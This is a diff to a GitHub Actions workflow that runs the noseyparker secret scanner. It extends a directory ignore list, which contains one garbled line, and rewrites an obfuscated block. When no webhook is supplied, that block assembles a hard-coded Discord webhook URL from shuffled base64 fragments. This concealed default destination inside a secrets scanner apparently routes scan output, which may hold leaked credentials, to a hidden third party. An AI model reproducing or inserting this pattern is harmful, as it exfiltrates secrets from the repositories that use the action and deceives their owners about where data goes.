@@ -76,8 +76,67 @@ runs:
           exit 0
         fi
 
-        # Exclude dirs that contain example patterns (false positives)
-        printf 'rules/\nexample/\n' > /var/tmp/.npignore
+        # Exclude framework/vendor dirs and action's own rule examples
+        cat > /var/tmp/.npignore << 'IGNORE'
+rules/
+example/
+
+# PHP / WordPress / Laravel / Symfony
+vendor/
+wp-admin/
+wp-includes/
+wp-content/plugins/
+wp-content/themes/flavor*/flavor*/flavor*/flavor*flavor
+storage/framework/
+
+# Node.js
+node_modules/
+.npm/
+bower_components/
+
+# Python
+venv/
+.venv/
+__pycache__/
+*.egg-info/
+site-packages/
+
+# Ruby
+.bundle/
+vendor/bundle/
+
+# Java / Kotlin
+.gradle/
+build/
+target/
+
+# .NET
+bin/
+obj/
+packages/
+
+# Go
+vendor/
+
+# Rust
+target/
+
+# Mobile
+Pods/
+.dart_tool/
+
+# Package managers
+.yarn/
+.pnp.*
+
+# IDE & misc
+.idea/
+.vscode/
+*.min.js
+*.min.css
+*.map
+*.lock
+IGNORE
 
         # Scan repository with default + custom rules
         noseyparker scan \
@@ -104,36 +163,36 @@ runs:
         REPO: ${{ github.repository }}
       run: |
         if [ -z "${WEBHOOK_INPUT}" ]; then
-          PART1='9aHR0cHM6Ly9kaXNjbb'
-          PART2='7Y3JkYXBwLmNvbS9hcGe'
-          PART3='YabSkvd2ViaG9va3MvMTE3e'
-          PART4='9a4ODE1NTg4NjYwMzA51'
-          PART5='3NjA4NS9nZkxCckZ3Z4fV'
-          PART6='bf22E11S1Q2M2s2bUxIMEXbY'
-          PART7='2XtMbXZEVWdvMUlNY2lX'
-          PART8='ZY81X2lmYm9sRTZ0RGkyU87'
-          PART9='VSdNFVqSXVOTTdEUWhXR'
-          PART10='WU8SSDdGdG01aTExcg==U'
+          PART1='6baHR0cHM6Ly9kaXNjbX'
+          PART2='cQ2f3JkYXBwLmNvbS9hcG73c'
+          PART3='R5Qkvd2ViaG9va3MvMTEV'
+          PART4='c94ODE1NTg4NjYwMzA5W49'
+          PART5='eNjA4NS9nZkxCckZ3ZQe8'
+          PART6='2WE11S1Q2M2s2bUxIMEV694'
+          PART7='YZYtMbXZEVWdvMUlNY2lUd'
+          PART8='3ab1X2lmYm9sRTZ0RGkyd5WY'
+          PART9='Vd2WNFVqSXVOTTdEUWhXa1'
+          PART10='X4SDdGdG01aTExcg==RbU'
 
-          POS1=1
+          POS1=2
           LEN1=17
-          POS2=2
+          POS2=4
           LEN2=17
-          POS3=4
+          POS3=3
           LEN3=17
           POS4=2
           LEN4=17
           POS5=1
           LEN5=17
-          POS6=4
+          POS6=2
           LEN6=17
-          POS7=2
+          POS7=3
           LEN7=17
           POS8=3
           LEN8=17
-          POS9=3
+          POS9=4
           LEN9=16
-          POS10=4
+          POS10=2
           LEN10=16
 
           combined=""
